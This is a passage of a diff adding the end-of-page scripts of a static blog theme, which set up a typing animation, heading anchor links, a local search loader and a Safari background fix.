+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+  <script src="/lib/anchor/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script>
+    if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent) || (/Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent))) {
+      $("#background").css("background-attachment", "scroll");
+    }
+  </script>
 
 </body>
 </html>
